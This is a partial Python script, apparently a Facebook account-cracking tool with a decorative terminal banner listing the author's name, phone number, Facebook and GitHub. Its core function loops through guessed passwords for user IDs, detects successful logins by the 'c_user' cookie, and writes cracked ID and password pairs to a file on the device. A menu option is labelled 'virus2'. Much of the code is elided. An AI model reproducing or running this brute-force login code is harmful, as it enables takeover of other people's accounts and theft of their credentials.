...
\033[92;1m ▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
\033[38;5;46m ▊   ‌‌‌‌‌‌                                              ██
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1mAUTHOR   \033[38;5;196m: \33[97;1mShowrob Chowdhury  ♚   \033[38;5;46m           ▇▎ 
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1mFACEBOOK  \033[38;5;196m: \033[1;92mSHOWROB CHOWDHURY   \033[38;5;46m             ▇▎  
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1mWHATSAPP  \033[38;5;196m: \033[1;92m+8801739237334 \033[38;5;46m                  ▇▎
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1mGITHUB   \033[38;5;196m: \033[1;92mhttps://github.com/SHOWROB-404\033[38;5;46m.  ▇▎
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1mTEAM  \033[38;5;196m: \033[1;92mDARK FORCE -71 \33[97;1m⬤  \033[38;5;46m        ▇▎           
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1mNETWORK  \033[38;5;196m: \033[1;92m𝟑𝐆\033[97;1m,\033[1;92m𝟒𝐆\033[97;1m/\033[1;92m𝟓𝐆\033[97;1m, \033[1;92m𝐎𝐍 \033[38;5;46m                    ▇▎      
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1mVERSION  \033[38;5;196m: \033[1;92m 𝟑.𝟎.𝟏 \033[1;92m𝐔𝐥𝐭𝐫𝐚 \033[38;5;46m             ▇▎           
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1mTOOLS   \033[38;5;196m: \33[97;1m𝐑𝐀𝐍𝐃𝐎𝐌 + 𝐅𝐈𝐋𝐄 \033[38;5;46m                    ▇▎
\033[38;5;46m ▊                                                 ▇▇
\033[92;1m ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀""")
...
def Main():
	...
	opt = input('𝐂𝐡??𝐨𝐬𝐞 𝐨𝐩𝐭𝐢𝐨𝐧 \033[97;1m➠ ')
	if opt =='1':
		x()
	if opt =='2':
		virus2()
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/qr/KV2WW2DFFQ62M1');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/its.me.showrob.okh');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/SHOWROB-404');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mSHOWROB\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/SHOWROB-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[SHOWROB] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
       # sys.stdout.write(f" \r{R} [{B} SHOWROB{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
def b(uid,pwx,tl):
